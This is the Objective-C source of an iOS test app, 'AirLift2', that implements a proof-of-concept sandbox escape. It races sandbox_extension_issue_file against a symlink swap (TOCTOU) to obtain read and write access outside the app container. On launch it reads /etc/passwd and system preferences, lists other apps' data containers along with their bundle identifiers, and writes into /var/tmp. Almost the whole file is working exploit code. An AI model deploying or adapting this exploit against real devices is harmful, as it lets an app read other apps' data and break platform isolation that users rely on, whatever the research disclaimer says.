// AirLift2 - sandbox_extension issue/consume TOCTOU (no NOFOLLOW)
// 原理: sandbox_extension_issue_file 在签发时解析符号链接，但不强制
// SANDBOX_EXTENSION_NOFOLLOW；签发后把链接换成沙箱外目标，内核 consume 时
// 只比对 token 里的路径，不校验解析后的真实目标。
// 仅用于自有设备的安全研究。

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

extern char *sandbox_extension_issue_file(const char *cls, const char *path, uint64_t flags);
extern int64_t sandbox_extension_consume(const char *token);
extern void sandbox_extension_release(int64_t handle);

static NSString *gLink;    // 我们控制的符号链接
static NSString *gAnchor;  // 容器内真实文件（签发扩展时的合法目标）
static NSMutableString *gLog;

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[airlift2] %@", s);
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [gLog appendString:s];
            [gLog appendString:@"\n"];
        });
    }
}

static void setupOnce(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *tmp = NSTemporaryDirectory();
        gLink = [tmp stringByAppendingPathComponent:@"l"];
        gAnchor = [tmp stringByAppendingPathComponent:@"s"];
        [@"anchor" writeToFile:gAnchor atomically:YES
                      encoding:NSUTF8StringEncoding error:nil];
        gLog = [NSMutableString string];
    });
}

// 用一个必然合法的路径（容器内 anchor）签发扩展，然后把链接换成 target
static char *issueThroughAnchor(const char *cls) {
    setupOnce();
    unlink(gLink.fileSystemRepresentation);
    if (symlink(gAnchor.fileSystemRepresentation, gLink.fileSystemRepresentation) != 0) {
        L(@"symlink(anchor) failed: %s", strerror(errno));
        return NULL;
    }
    char *tok = sandbox_extension_issue_file(cls, gLink.fileSystemRepresentation, 0);
    if (!tok) {
        L(@"issue_file failed for %s (class=%s)", gLink.UTF8String, cls);
    }
    return tok;
}

static void repoint(const char *target) {
    unlink(gLink.fileSystemRepresentation);
    symlink(target, gLink.fileSystemRepresentation);
}

static NSData *escapedRead(NSString *target) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read");
    if (!tok) return nil;
    repoint(target.fileSystemRepresentation);
    int64_t h = sandbox_extension_consume(tok);
    free(tok);
    NSError *err = nil;
    NSData *d = [NSData dataWithContentsOfFile:gLink options:0 error:&err];
    if (h > 0) sandbox_extension_release(h);
    if (!d) L(@"  read failed: %@", err.localizedDescription);
    return d;
}

static NSArray<NSString *> *escapedList(NSString *dir) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read");
    if (!tok) return @[];
    repoint(dir.fileSystemRepresentation);
    int64_t h = sandbox_extension_consume(tok);
    free(tok);
    NSMutableArray *out = [NSMutableArray array];
    DIR *dp = opendir(gLink.fileSystemRepresentation);
    if (dp) {
        struct dirent *e;
        while ((e = readdir(dp))) {
            if (strcmp(e->d_name, ".") && strcmp(e->d_name, ".."))
                [out addObject:[NSString stringWithUTF8String:e->d_name]];
        }
        closedir(dp);
    } else {
        L(@"  opendir failed: %s", strerror(errno));
    }
    if (h > 0) sandbox_extension_release(h);
    return out;
}

static BOOL escapedWrite(NSString *target, NSData *data) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read-write");
    if (!tok) return NO;
    repoint(target.fileSystemRepresentation);
    int64_t h = sandbox_extension_consume(tok);
    free(tok);
    BOOL ok = [data writeToFile:gLink options:0 error:nil];
    if (h > 0) sandbox_extension_release(h);
    return ok;
}

static void runChecks(void) {
    L(@"=== sandbox_extension TOCTOU ===");
    L(@"uid=%d tmp=%@", getuid(), NSTemporaryDirectory());

    L(@"[1] baseline: read /etc/passwd without escape");
    NSData *plain = [NSData dataWithContentsOfFile:@"/etc/passwd"];
    L(@"    result: %@", plain ? @"READABLE (sandbox 未拦)" : @"blocked");

    L(@"[2] escaped read /etc/passwd");
    NSData *pw = escapedRead(@"/etc/passwd");
    if (pw) {
        NSString *s = [[NSString alloc] initWithData:[pw subdataWithRange:NSMakeRange(0, MIN((NSUInteger)120, pw.length))]
                                            encoding:NSUTF8StringEncoding];
        L(@"    OK %lu bytes\n%@", (unsigned long)pw.length, s ?: @"(binary)");
    } else {
        L(@"    FAILED");
    }

    L(@"[3] escaped read .GlobalPreferences.plist");
    NSData *gp = escapedRead(@"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
    L(@"    result: %@", gp ? [NSString stringWithFormat:@"OK %lu bytes", (unsigned long)gp.length] : @"FAILED");

    L(@"[4] list other app containers");
    NSArray *dirs = escapedList(@"/var/mobile/Containers/Data/Application");
    L(@"    containers: %lu", (unsigned long)dirs.count);
    NSUInteger n = 0;
    for (NSString *uuid in dirs) {
        if (n++ >= 8) break;
        NSString *meta = [NSString stringWithFormat:
            @"/var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist",
            uuid];
        NSData *md = escapedRead(meta);
        NSString *bid = @"?";
        if (md) {
            id pl = [NSPropertyListSerialization propertyListWithData:md options:0 format:NULL error:nil];
            if ([pl isKindOfClass:[NSDictionary class]])
                bid = pl[@"MCMMetadataIdentifier"] ?: @"?";
        }
        L(@"    %@ -> %@", [uuid substringToIndex:MIN((NSUInteger)8, uuid.length)], bid);
    }

    L(@"[5] escaped write /var/tmp");
    NSString *dst = [NSString stringWithFormat:@"/var/tmp/cl-%.8x.bin", arc4random()];
    NSData *payload = [@"airlift2" dataUsingEncoding:NSUTF8StringEncoding];
    BOOL w = escapedWrite(dst, payload);
    L(@"    write %@: %@", dst, w ? @"OK" : @"FAILED");
    if (w) {
        NSData *back = escapedRead(dst);
        L(@"    readback: %@", back ? @"OK" : @"FAILED");
        unlink(dst.fileSystemRepresentation);
    }
    L(@"=== done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    setupOnce();
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    self.tv = [[UITextView alloc] initWithFrame:CGRectZero];
    self.tv.editable = NO;
    self.tv.textColor = [UIColor greenColor];
    self.tv.backgroundColor = [UIColor blackColor];
    self.tv.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.tv.translatesAutoresizingMaskIntoConstraints = NO;
    self.tv.text = gLog;

    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    [btn setTitle:@"RUN" forState:UIControlStateNormal];
    [btn addTarget:self action:@selector(run) forControlEvents:UIControlEventTouchUpInside];
    btn.translatesAutoresizingMaskIntoConstraints = NO;

    [vc.view addSubview:self.tv];
    [vc.view addSubview:btn];
    [NSLayoutConstraint activateConstraints:@[
        [self.tv.topAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.topAnchor],
        [self.tv.leadingAnchor constraintEqualToAnchor:vc.view.leadingAnchor],
        [self.tv.trailingAnchor constraintEqualToAnchor:vc.view.trailingAnchor],
        [self.tv.bottomAnchor constraintEqualToAnchor:btn.topAnchor constant:-8],
        [btn.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor],
        [btn.bottomAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.bottomAnchor constant:-8],
    ]];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runChecks(); });
    return YES;
}

- (void)run {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runChecks(); });
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
